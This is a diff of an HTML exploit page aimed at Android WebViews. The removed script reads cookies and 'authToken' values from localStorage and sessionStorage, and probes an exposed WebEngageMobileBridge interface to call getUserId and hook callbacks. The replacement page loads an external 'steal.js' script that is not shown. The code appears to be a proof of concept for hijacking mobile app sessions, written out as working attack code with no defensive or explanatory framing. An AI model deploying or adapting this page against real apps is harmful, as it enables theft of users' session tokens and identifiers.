@@ -1,61 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Exploit Page</title>
-  <style>
-    body {
-      font-family: monospace;
-      background-color: #111;
-      color: #0f0;
-      padding: 20px;
-    }
-    #output {
-      white-space: pre-wrap;
-    }
-  </style>
-</head>
-<body>
-  <h2>Exploit Running...</h2>
-  <div id="output">Waiting for response...</div>
-
-  <script>
-    function print(msg) {
-      document.getElementById('output').textContent += "\n" + msg;
-    }
-
-    try {
-      // Try document.cookie
-      print("Cookies: " + document.cookie);
-
-      // Try localStorage and sessionStorage
-      const lsToken = localStorage.getItem("authToken");
-      const ssToken = sessionStorage.getItem("authToken");
-      print("localStorage authToken: " + lsToken);
-      print("sessionStorage authToken: " + ssToken);
-
-      // Try calling WebEngageMobileBridge (common interface)
-      if (window.WebEngageMobileBridge) {
-        print("WebEngageMobileBridge exists");
-
-        // Call a known method — this will work only if it's exposed and doesn't need arguments
-        try {
-          const result = WebEngageMobileBridge.getUserId?.();
-          print("WebEngageMobileBridge.getUserId(): " + result);
-        } catch (e) {
-          print("getUserId() error: " + e.message);
-        }
-
-        // If it has a callback system, we may need to define a JS function like this:
-        window.AndroidCallback = function(action, data) {
-          print("Callback: " + action + " | " + data);
-        };
-      } else {
-        print("WebEngageMobileBridge not found.");
-      }
-
-    } catch (e) {
-      print("Exception: " + e.message);
-    }
-  </script>
-</body>
+  <head>
+    <title>Exploit WebView</title>
+    <script src="steal.js"></script>
+  </head>
+  <body>
+    <h2>Loading exploit...</h2>
+    <div id="output">Waiting...</div>
+  </body>
 </html>
